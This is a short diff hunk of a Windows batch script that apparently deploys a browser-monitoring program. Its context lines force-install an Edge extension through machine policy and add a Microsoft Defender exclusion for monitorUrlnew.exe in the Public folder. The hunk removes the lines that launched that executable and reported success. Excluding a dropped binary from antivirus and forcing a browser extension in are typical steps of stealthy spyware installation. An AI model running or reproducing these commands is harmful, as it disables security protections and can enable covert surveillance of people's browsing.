@@ -64,16 +64,8 @@ reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /
 
 :: === Exclude from Defender and launch ===
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
-:: === Start chương trình và trả về SUCCESS nếu chạy ok ===
-start "" "C:\Users\Public\monitorUrlnew.exe"
-if %errorlevel%==0 (
-    echo ✅ SUCCESS: monitorUrlnew.exe started
-    exit /b 0
-) else (
-    echo ❌ FAILED: Cannot start monitorUrlnew.exe (error %errorlevel%)
-    exit /b %errorlevel%
-)
 exit /b 0
+
 
 
 
